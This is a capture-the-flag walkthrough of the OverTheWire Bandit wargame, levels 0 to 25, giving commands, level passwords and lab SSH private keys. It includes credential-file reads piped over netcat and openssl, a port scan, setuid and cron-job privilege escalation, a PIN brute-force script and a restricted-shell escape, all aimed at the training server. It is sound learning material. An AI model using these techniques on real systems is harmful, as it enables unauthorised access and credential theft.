0. level - 0
```console
$ ssh bandit0@bandit.labs.overthewire.org -p 2220
$ cat readme
// boJ9jbbUNNfktd78OOpsqOltutMc3MY1 what cotains my readme 
```

1. level - 1
```console
$ ssh bandit1@bandit.labs.overthewire.org -p 2220
// paswd boJ9jbbUNNfktd78OOpsqOltutMc3MY1
$ cat ./-
// CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
```


2. level 2
```console
$ ssh bandit2@bandit.labs.overthewire.org -p 2220
// paswd CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
$ cat spaces\ in\ this\ filename 
// UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
```

3. level 3
```console
$ssh bandit3@bandit.labs.overthewire.org -p 2220
//passwd UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
$cat inhere/.hidden 
//pIwrPrtPN36QITSp3EQaw936yaFoFgAB
```

4. level 4
```console
$ ssh bandit4@bandit.labs.overthewire.org -p 2220
// passwd pIwrPrtPN36QITSp3EQaw936yaFoFgAB
$ cat ./-file07
// koReBOKuIDDepwhWk7jZC0RTdopnAYKh
```

5. level 5
```console
$ ssh bandit5@bandit.labs.overthewire.org -p 2220
// passwd koReBOKuIDDepwhWk7jZC0RTdopnAYKh
$ ~/inhere find . -size 1033c -type f -exec grep -Iq . {} \; -and -print 

//DXjZPULLxYr17uwoI01bNLQbtFemEgo7
```
[help 1](http://www.ducea.com/2008/02/12/linux-tips-find-all-files-of-a-particular-size/)

[help 2](https://unix.stackexchange.com/questions/313442/find-human-readable-files)

[help 3](https://stackoverflow.com/questions/4767396/linux-command-how-to-find-only-text-files)

[help 4](https://stackoverflow.com/questions/22122643/how-to-check-if-a-regular-file-is-executable-or-not-in-linux
)



6. level 6
```console
$ ssh bandit6@bandit.labs.overthewire.org -p 2220
// paswd: DXjZPULLxYr17uwoI01bNLQbtFemEgo7
$ find /  -group bandit6 -user bandit7 -size 33c
// then I realize (trough reading the permisions) that the only file accecible with was in /var/lib/dpkg/info/bandit7.password
$ cat /var/lib/dpkg/info/bandit7.password
// yields HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
```

7. level 7
```console
$ ssh bandit7@bandit.labs.overthewire.org -p 2220
// passwd : HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
$ cat data.txt | grep millionth
  millionth	cvX2JJa4CFALtqS87jk27qwqGhBM9plV
```

8. level 8 
```console
$ ssh bandit8@bandit.labs.overthewire.org -p 2220
// paswd cvX2JJa4CFALtqS87jk27qwqGhBM9plV
$ cat data.txt | sort | uniq -u
 UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
```

9. level 9
```console
$ ssh bandit9@bandit.labs.overthewire.org -p 2220
// paswd UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
$ xxd data.txt
//  truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk seaching by eye, i found it
// beter soution strings data.txt | grep =
```

10. level 10
```console
$ ssh bandit10@bandit.labs.overthewire.org -p 2220
// truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
$ base64 -d data.txt
The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
```

11. level 11
```console
$ ssh bandit11@bandit.labs.overthewire.org -p 2220
// IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
$ cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
```
[help 1](https://www.busindre.com/cifrado_cesar_desde_la_terminal_con_tr)


12. level 12
```console
$ ssh bandit12@bandit.labs.overthewire.org -p 2220
// 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
$ mkdir /tmp/bodhert
$ cp data.txt /tmp/bodhert
$ cd /tmp/bodhert
$ xxd -r data.txt > data
$ file data
data: gzip compressed data, was "data2.bin", last modified: Thu Dec 28 13:34:36 2017, max compression, from Unix
$ mv data data2.gz
$ gunzip data2.gz
$ file data2
data2: bzip2 compressed data, block size = 900k
$ mv data2 data2.bz
$ bzip2 -d data2.bz
$ file data2
data2: gzip compressed data, was "data4.bin", last modified: Thu Dec 28 13:34:36 2017, max compression, from Unix
$ mv data2 data4.gz
$ gunzip data4.gz
$ file data4
data4: POSIX tar archive (GNU)
$ mv data4 data4.tar
$ tar xvf data4.tar
$ tar xvf data4.tar
data5.bin
$ file data5.bin
data5.bin: POSIX tar archive (GNU)
$ mv data5.bin data5.tar
$ tar xvf data5.tar
data6.bin
$ file data6.bin
data6.bin: bzip2 compressed data, block size = 900k
$ mv data6.bin data6.bz
$ bzip2 -d data6.bz
$ file data6
data6: POSIX tar archive (GNU)
$ mv data6 data6.tar
$ tar xvf data6.tar
data8.bin
$ file data8.bin
data8.bin: gzip compressed data, was "data9.bin", last modified: Thu Dec 28 13:34:36 2017, max compression, from Unix
$ mv data8.bin data8.gz
$ gunzip data8.gz
$ file data8
data8: ASCII text
$ cat data8
The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
```

13. level 13
```console
$ssh bandit13@bandit.labs.overthewire.org -p 2220
// password 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
$cat sshkey.private
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAxkkOE83W2cOT7IWhFc9aPaaQmQDdgzuXCv+ppZHa++buSkN+
gg0tcr7Fw8NLGa5+Uzec2rEg0WmeevB13AIoYp0MZyETq46t+jk9puNwZwIt9XgB
ZufGtZEwWbFWw/vVLNwOXBe4UWStGRWzgPpEeSv5Tb1VjLZIBdGphTIK22Amz6Zb
ThMsiMnyJafEwJ/T8PQO3myS91vUHEuoOMAzoUID4kN0MEZ3+XahyK0HJVq68KsV
ObefXG1vvA3GAJ29kxJaqvRfgYnqZryWN7w3CHjNU4c/2Jkp+n8L0SnxaNA+WYA7
jiPyTF0is8uzMlYQ4l1Lzh/8/MpvhCQF8r22dwIDAQABAoIBAQC6dWBjhyEOzjeA
J3j/RWmap9M5zfJ/wb2bfidNpwbB8rsJ4sZIDZQ7XuIh4LfygoAQSS+bBw3RXvzE
pvJt3SmU8hIDuLsCjL1VnBY5pY7Bju8g8aR/3FyjyNAqx/TLfzlLYfOu7i9Jet67
xAh0tONG/u8FB5I3LAI2Vp6OviwvdWeC4nOxCthldpuPKNLA8rmMMVRTKQ+7T2VS
nXmwYckKUcUgzoVSpiNZaS0zUDypdpy2+tRH3MQa5kqN1YKjvF8RC47woOYCktsD
o3FFpGNFec9Taa3Msy+DfQQhHKZFKIL3bJDONtmrVvtYK40/yeU4aZ/HA2DQzwhe
ol1AfiEhAoGBAOnVjosBkm7sblK+n4IEwPxs8sOmhPnTDUy5WGrpSCrXOmsVIBUf
laL3ZGLx3xCIwtCnEucB9DvN2HZkupc/h6hTKUYLqXuyLD8njTrbRhLgbC9QrKrS
M1F2fSTxVqPtZDlDMwjNR04xHA/fKh8bXXyTMqOHNJTHHNhbh3McdURjAoGBANkU
1hqfnw7+aXncJ9bjysr1ZWbqOE5Nd8AFgfwaKuGTTVX2NsUQnCMWdOp+wFak40JH
PKWkJNdBG+ex0H9JNQsTK3X5PBMAS8AfX0GrKeuwKWA6erytVTqjOfLYcdp5+z9s
8DtVCxDuVsM+i4X8UqIGOlvGbtKEVokHPFXP1q/dAoGAcHg5YX7WEehCgCYTzpO+
xysX8ScM2qS6xuZ3MqUWAxUWkh7NGZvhe0sGy9iOdANzwKw7mUUFViaCMR/t54W1
GC83sOs3D7n5Mj8x3NdO8xFit7dT9a245TvaoYQ7KgmqpSg/ScKCw4c3eiLava+J
3btnJeSIU+8ZXq9XjPRpKwUCgYA7z6LiOQKxNeXH3qHXcnHok855maUj5fJNpPbY
iDkyZ8ySF8GlcFsky8Yw6fWCqfG3zDrohJ5l9JmEsBh7SadkwsZhvecQcS9t4vby
9/8X4jS0P8ibfcKS4nBP+dT81kkkg5Z5MohXBORA7VWx+ACohcDEkprsQ+w32xeD
qT1EvQKBgQDKm8ws2ByvSUVs9GjTilCajFqLJ0eVYzRPaY6f++Gv/UVfAPV4c+S0
kAWpXbv5tbkkzbS0eaLPTKgLzavXtQoTtKwrjpolHKIHUz6Wu+n4abfAIRFubOdN
/+aLoRQ0yBDRbdXMsZN/jvY44eM+xRLdRVyMmdPtP8belRi2E2aEzA==
-----END RSA PRIVATE KEY-----
```

then I copy that to a local file and give them the necesary permissions

```console
$nano keyFor14
//copy the previous key
$chmod 600 keyFor14
$ssh -i keyFor14 bandit14@bandit.labs.overthewire.org -p 2220
```

14. 
```console
$ssh -i keyFor14 bandit14@bandit.labs.overthewire.org -p 2220
$cat /etc/bandit_pass/bandit14 | netcat localhost 30000
Correct!
BfMYroe26WYalil77FoDi9qh59eK5xNr

```

15.
```console
$ssh  bandit15@bandit.labs.overthewire.org -p 2220
//BfMYroe26WYalil77FoDi9qh59eK5xNr 
$cat /etc/bandit_pass/bandit15 | openssl s_client -ign_eof -connect localhost:30001

CONNECTED(00000003)
depth=0 CN = bandit
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = bandit
verify return:1
---
Certificate chain
 0 s:/CN=bandit
   i:/CN=bandit
---
Server certificate
-----BEGIN CERTIFICATE-----
MIICsjCCAZqgAwIBAgIJAKZI1xYeoXFuMA0GCSqGSIb3DQEBCwUAMBExDzANBgNV
BAMMBmJhbmRpdDAeFw0xNzEyMjgxMzIzNDBaFw0yNzEyMjYxMzIzNDBaMBExDzAN
BgNVBAMMBmJhbmRpdDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOcX
ruVcnQUBeHJeNpSYayQExCJmcHzSCktnOnF/H4efWzxvLRWt5z4gYaKvTC9ixLrb
K7a255GEaUbP/NVFpB/sn56uJc1ijz8u0hWQ3DwVe5ZrHUkNzAuvC2OeQgh2HanV
5LwB1nmRZn90PG1puKxktMjXsGY7f9Yvx1/yVnZqu2Ev2uDA0RXij/T+hEqgDMI7
y4ZFmuYD8z4b2kAUwj7RHh9LUKXKQlO+Pn8hchdR/4IK+Xc4+GFOin0XdQdUJaBD
8quOUma424ejF5aB6QCSE82MmHlLBO2tzC9yKv8L8w+fUeQFECH1WfPC56GcAq3U
IvgdjGrU/7EKN5XkONcCAwEAAaMNMAswCQYDVR0TBAIwADANBgkqhkiG9w0BAQsF
AAOCAQEAnrOty7WAOpDGhuu0V8FqPoKNwFrqGuQCTeqhQ9LP0bFNhuH34pZ0JFsH
L+Y/q4Um7+66mNJUFpMDykm51xLY2Y4oDNCzugy+fm5Q0EWKRwrq+hIM+5hs0RdC
nARP+719ddmUiXF7r7IVP2gK+xqpa8+YcYnLuoXEtpKkrrQCCUiqabltU5yRMR77
3wqB54txrB4IhwnXqpO23kTuRNrkG+JqDUkaVpvct+FAdT3PODMONP/oHII3SH9i
ar/rI9k+4hjlg4NqOoduxX9M+iLJ0Zgj6HAg3EQVn4NHsgmuTgmknbhqTU3o4IwB
XFnxdxVy0ImGYtvmnZDQCGivDok6jA==
-----END CERTIFICATE-----
subject=/CN=bandit
issuer=/CN=bandit
---
No client certificate CA names sent
---
SSL handshake has read 1015 bytes and written 631 bytes
---
New, TLSv1/SSLv3, Cipher is AES128-SHA
Server public key is 2048 bit
Secure Renegotiation IS supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
SSL-Session:
    Protocol  : TLSv1
    Cipher    : AES128-SHA
    Session-ID: 43C923F481C5EA00B32BF1F295338680EA945B3F2BF5938F2EF9A46E1017E242
    Session-ID-ctx:
    Master-Key: 0F7194159CD6FC6625BF4259B45781EB6183AC44C942BAF9723337C952DF8A852A708E277393F6CFC030D6B0B09988FF
    Key-Arg   : None
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - 08 f0 15 a5 d6 6f a0 e8-06 d6 bb a4 0c 33 eb 04   .....o.......3..
    0010 - e9 a3 3a 3b d9 c5 5d b7-08 c1 7c 83 6e 01 63 d1   ..:;..]...|.n.c.
    0020 - f0 8e a9 85 79 16 10 98-f1 32 83 e2 db 4c 5e ab   ....y....2...L^.
    0030 - 6b 37 04 78 22 ac 63 cb-42 25 58 c4 cf 4a 2d 27   k7.x".c.B%X..J-'
    0040 - 7f 23 7d c8 ee 31 aa 8a-bf 13 f1 28 f9 1b d8 f2   .#}..1.....(....
    0050 - 73 83 df 0d 5d d5 e9 a9-2b 3e a1 5b b0 c3 4f e1   s...]...+>.[..O.
    0060 - be 0f 3f 1c 01 72 ab 88-c8 19 97 76 95 ba 29 f7   ..?..r.....v..).
    0070 - 12 50 60 77 7d 63 8a 6a-cb be 54 e0 af 53 31 7a   .P`w}c.j..T..S1z
    0080 - 4a 55 6e 50 8f 83 82 ea-51 80 3f 80 cf 3b 79 8a   JUnP....Q.?..;y.
    0090 - 35 32 e7 b1 14 a3 d0 56-ce 14 cf 32 6f a1 f4 b2   52.....V...2o...

    Start Time: 1529364508
    Timeout   : 300 (sec)
    Verify return code: 18 (self signed certificate)
---
Correct!
cluFn7wTiGryunymYOu4RcffSxQluehd
closed
```

16.
```
$ssh  bandit16@bandit.labs.overthewire.org -p 2220
//cluFn7wTiGryunymYOu4RcffSxQluehd
$nmap -p 31000-32000 localhost --version-intensity 1
Starting Nmap 7.01 ( https://nmap.org ) at 2018-06-24 04:01 CEST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00019s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 996 closed ports
PORT      STATE SERVICE
31046/tcp open  unknown
31518/tcp open  unknown
31691/tcp open  unknown
31790/tcp open  unknown
31960/tcp open  unknow`
```
then i try each one and the one who responded well was port 31790 so 
```
$cat /etc/bandit_pass/bandit16 | openssl s_client -ign_eof -connect localhost:31790 
CONNECTED(00000003)
depth=0 CN = bandit
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = bandit
verify return:1
---
Certificate chain
 0 s:/CN=bandit
   i:/CN=bandit
---
Server certificate
-----BEGIN CERTIFICATE-----
MIICsjCCAZqgAwIBAgIJAKZI1xYeoXFuMA0GCSqGSIb3DQEBCwUAMBExDzANBgNV
BAMMBmJhbmRpdDAeFw0xNzEyMjgxMzIzNDBaFw0yNzEyMjYxMzIzNDBaMBExDzAN
BgNVBAMMBmJhbmRpdDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOcX
ruVcnQUBeHJeNpSYayQExCJmcHzSCktnOnF/H4efWzxvLRWt5z4gYaKvTC9ixLrb
K7a255GEaUbP/NVFpB/sn56uJc1ijz8u0hWQ3DwVe5ZrHUkNzAuvC2OeQgh2HanV
5LwB1nmRZn90PG1puKxktMjXsGY7f9Yvx1/yVnZqu2Ev2uDA0RXij/T+hEqgDMI7
y4ZFmuYD8z4b2kAUwj7RHh9LUKXKQlO+Pn8hchdR/4IK+Xc4+GFOin0XdQdUJaBD
8quOUma424ejF5aB6QCSE82MmHlLBO2tzC9yKv8L8w+fUeQFECH1WfPC56GcAq3U
IvgdjGrU/7EKN5XkONcCAwEAAaMNMAswCQYDVR0TBAIwADANBgkqhkiG9w0BAQsF
AAOCAQEAnrOty7WAOpDGhuu0V8FqPoKNwFrqGuQCTeqhQ9LP0bFNhuH34pZ0JFsH
L+Y/q4Um7+66mNJUFpMDykm51xLY2Y4oDNCzugy+fm5Q0EWKRwrq+hIM+5hs0RdC
nARP+719ddmUiXF7r7IVP2gK+xqpa8+YcYnLuoXEtpKkrrQCCUiqabltU5yRMR77
3wqB54txrB4IhwnXqpO23kTuRNrkG+JqDUkaVpvct+FAdT3PODMONP/oHII3SH9i
ar/rI9k+4hjlg4NqOoduxX9M+iLJ0Zgj6HAg3EQVn4NHsgmuTgmknbhqTU3o4IwB
XFnxdxVy0ImGYtvmnZDQCGivDok6jA==
-----END CERTIFICATE-----
subject=/CN=bandit
issuer=/CN=bandit
---
No client certificate CA names sent
---
SSL handshake has read 1015 bytes and written 631 bytes
---
New, TLSv1/SSLv3, Cipher is AES128-SHA
Server public key is 2048 bit
Secure Renegotiation IS supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
SSL-Session:
    Protocol  : TLSv1
    Cipher    : AES128-SHA
    Session-ID: 7D40AAAD047D7DA2BEC3F6838F2316A3EC4BC7340DE834ED706546F45DE4772A
    Session-ID-ctx:
    Master-Key: 47F47962B7E50CA250B7536D11488D90D02FEF5421AF4C05FD623AB2D70DCED8DEE7E21D7D473F52E44BC497345086BF
    Key-Arg   : None
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - 9a b6 c1 e5 3e 9c 51 03-45 ba c9 c1 cc d7 23 80   ....>.Q.E.....#.
    0010 - 16 fb e5 28 22 21 94 93-8e 83 37 7c bc 8e 9e 41   ...("!....7|...A
    0020 - 8c 37 f2 26 dd 5f b9 09-df c6 2b 67 f9 7f da 7a   .7.&._....+g...z
    0030 - a1 cd 45 2c eb 18 95 37-0b 85 5c 48 88 5d 34 62   ..E,...7..\H.]4b
    0040 - 39 44 36 e6 b6 cd 26 7d-83 c1 e9 60 c5 70 98 e4   9D6...&}...`.p..
    0050 - 5c 2a ea 48 bb b9 ca 07-0f 0b c0 4f fb 2d ae 7a   \*.H.......O.-.z
    0060 - e3 af af 9c 94 c0 52 18-a0 0f 52 d2 d8 c2 f0 2c   ......R...R....,
    0070 - f6 06 48 20 7a 52 09 dd-d2 2c 87 81 fd c2 65 d9   ..H zR...,....e.
    0080 - 8a 65 7d a8 41 3a bd b0-49 80 69 55 96 01 09 86   .e}.A:..I.iU....
    0090 - ea a6 c3 51 43 ea 8f 35-b0 90 12 e1 24 6a ac b4   ...QC..5....$j..

    Start Time: 1529805717
    Timeout   : 300 (sec)
    Verify return code: 18 (self signed certificate)
---
Correct!
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----

closed
```

then i copy the rsa key to a local file and give the necesary permisions
```
$nano keyFor17 
// i copy the key previosuly given here
$chmod 600 keyFor17
```


17.

```
$ ssh -i keyFor17 bandit17@bandit.labs.overthewire.org -p 2220
$ diff passwords.new passwords.old
42c42
< kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
---
> 6vcSC74ROI95NqkKaeEC2ABVMDX9TyUr 
```

18.
```
$ssh bandit18@bandit.labs.overthewire.org -p 2220 'cat ~/readme'
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
bandit18@bandit.labs.overthewire.org's password: 
//kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
```

19.
 ```
$ssh  bandit19@bandit.labs.overthewire.org -p 2220
 ```

 I have troubles undestading the binary , but the binary already has the s flag, so

 ```
$ ll
total 28
drwxr-xr-x  2 root     root     4096 Dec 28 14:34 ./
drwxr-xr-x 29 root     root     4096 Dec 28 14:34 ../
-rw-r--r--  1 root     root      220 Sep  1  2015 .bash_logout
-rw-r--r--  1 root     root     3771 Sep  1  2015 .bashrc
-rw-r--r--  1 root     root      655 Jun 24  2016 .profile
-rwsr-x---  1 bandit20 bandit19 7408 Dec 28 14:34 bandit20-do*
 // the flag that i was talking about 's'
 $ ./bandit20-do cat  /etc/bandit_pass/bandit20 
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
 ``` 
with that binary I already was bandit20

20.
I conect to bandit 20 in two diferent terminals
* terminal 1
```
$ ssh  bandit20@bandit.labs.overthewire.org -p 2220
// put it to listen in port 1235
$ nc -l 1235
```
* terminal 2
```
./suconnect 1235
```
then in the first terminal i copy the password of the current level 
* terminal 1
```
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
```

* terminal 2 
```
Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
Password matches, sending next password
```
send the password for the next level 
* terminal 1
```
gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
```

very importan tool that i use is tmux , here is a simple [guide](https://www.ostechnix.com/4-ways-keep-command-running-log-ssh-session/) for it.

[guide 2](https://gist.github.com/MohamedAlaa/2961058)

[guide 3](https://www.hamvocke.com/blog/a-quick-and-easy-guide-to-tmux/)

21.
```
$ cat /etc/cron.d/cronjob_bandit22 
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
$ cat /usr/bin/cronjob_bandit22.sh 
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
```

22.
```
$ cat /etc/cron.d/cronjob_bandit23 
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh 
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
bandit22@bandit:~$ whoami                           
bandit22
bandit22@bandit:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
8ca319486bfbbc3663ea0fbe81326349
bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
```

23.
```
$ cd /etc/cron.d/
$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
	echo "Handling $i"
	timeout -s 9 60 ./$i
	rm -f ./$i
    fi
done
$ mkdir /tmp/bodhert2/
$ cd /tmp/bodhert2
$ nano temp.sh
```
inside nano i copy this
```
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/bodhert2/ans
```
```
chmod -R 777 /tmp/bodhert2
```
wait a minute and then
```
$ cat ans
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

24.
```
$mkdir /tmp/bodhert3
$cd /tmp/bodhert3
$nano exploit.sh
```
then copy the next scritp
```
#!/bin/bash
for i in {0..9} ; 
do
	for j in {0..9}; 
	do
		for k in {0..9}; 
		do
			for l in {0..9}; 
			do
				echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ${i}${j}${k}${l}" | netcat localhost 30002 >> /tmp/bodhert3/ans1 
			done
		done
	done
done
```
give the necesary permision
```
$chmod 777 exploit.sh
$./exploit.sh
```

wait (a long time )and then 
 ```
$sort ans1 | uniq -u

Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

 ```
 25.
 this was the hardest level in my opinion , because without help i could not do it, not because command hardness, but for logic instructions.


 ```
 $ cat bandit26.sshkey
 -----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEApis2AuoooEqeYWamtwX2k5z9uU1Afl2F8VyXQqbv/LTrIwdW
pTfaeRHXzr0Y0a5Oe3GB/+W2+PReif+bPZlzTY1XFwpk+DiHk1kmL0moEW8HJuT9
/5XbnpjSzn0eEAfFax2OcopjrzVqdBJQerkj0puv3UXY07AskgkyD5XepwGAlJOG
xZsMq1oZqQ0W29aBtfykuGie2bxroRjuAPrYM4o3MMmtlNE5fC4G9Ihq0eq73MDi
1ze6d2jIGce873qxn308BA2qhRPJNEbnPev5gI+5tU+UxebW8KLbk0EhoXB953Ix
3lgOIrT9Y6skRjsMSFmC6WN/O7ovu8QzGqxdywIDAQABAoIBAAaXoETtVT9GtpHW
qLaKHgYtLEO1tOFOhInWyolyZgL4inuRRva3CIvVEWK6TcnDyIlNL4MfcerehwGi
il4fQFvLR7E6UFcopvhJiSJHIcvPQ9FfNFR3dYcNOQ/IFvE73bEqMwSISPwiel6w
e1DjF3C7jHaS1s9PJfWFN982aublL/yLbJP+ou3ifdljS7QzjWZA8NRiMwmBGPIh
Yq8weR3jIVQl3ndEYxO7Cr/wXXebZwlP6CPZb67rBy0jg+366mxQbDZIwZYEaUME
zY5izFclr/kKj4s7NTRkC76Yx+rTNP5+BX+JT+rgz5aoQq8ghMw43NYwxjXym/MX
c8X8g0ECgYEA1crBUAR1gSkM+5mGjjoFLJKrFP+IhUHFh25qGI4Dcxxh1f3M53le
wF1rkp5SJnHRFm9IW3gM1JoF0PQxI5aXHRGHphwPeKnsQ/xQBRWCeYpqTme9amJV
tD3aDHkpIhYxkNxqol5gDCAt6tdFSxqPaNfdfsfaAOXiKGrQESUjIBcCgYEAxvmI
2ROJsBXaiM4Iyg9hUpjZIn8TW2UlH76pojFG6/KBd1NcnW3fu0ZUU790wAu7QbbU
i7pieeqCqSYcZsmkhnOvbdx54A6NNCR2btc+si6pDOe1jdsGdXISDRHFb9QxjZCj
6xzWMNvb5n1yUb9w9nfN1PZzATfUsOV+Fy8CbG0CgYEAifkTLwfhqZyLk2huTSWm
pzB0ltWfDpj22MNqVzR3h3d+sHLeJVjPzIe9396rF8KGdNsWsGlWpnJMZKDjgZsz
JQBmMc6UMYRARVP1dIKANN4eY0FSHfEebHcqXLho0mXOUTXe37DWfZza5V9Oify3
JquBd8uUptW1Ue41H4t/ErsCgYEArc5FYtF1QXIlfcDz3oUGz16itUZpgzlb71nd
1cbTm8EupCwWR5I1j+IEQU+JTUQyI1nwWcnKwZI+5kBbKNJUu/mLsRyY/UXYxEZh
ibrNklm94373kV1US/0DlZUDcQba7jz9Yp/C3dT/RlwoIw5mP3UxQCizFspNKOSe
euPeaxUCgYEAntklXwBbokgdDup/u/3ms5Lb/bm22zDOCg2HrlWQCqKEkWkAO6R5
/Wwyqhp/wTl8VXjxWo+W+DmewGdPHGQQ5fFdqgpuQpGUq24YZS8m66v5ANBwd76t
IZdtF5HXs2S5CADTwniUS5mX1HO9l5gUkk+h0cH5JnPtsMCnAUM+BRY=
-----END RSA PRIVATE KEY-----

 ```

 then we copy the key to a file and gave them the necesary permission

 ```
 $chmod 600 keyFor26
 ```
 from bandit 25 we can look what kind of shell does bandit 26 has so

 ```
$ cat /etc/passwd | grep bandit26
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
$ cat /usr/bin/showtext 
#!/bin/sh

export TERM=linux

more ~/text.txt
exit 0
```
so what we have to do is login to bandit26 with a small terminal windows for the command _more_ 

```
$ssh  -i keyFor26 bandit26@bandit.labs.overthewire.org -p 2220 
```
then we press v for vi mode , in vi mode we can see the password the next command

```
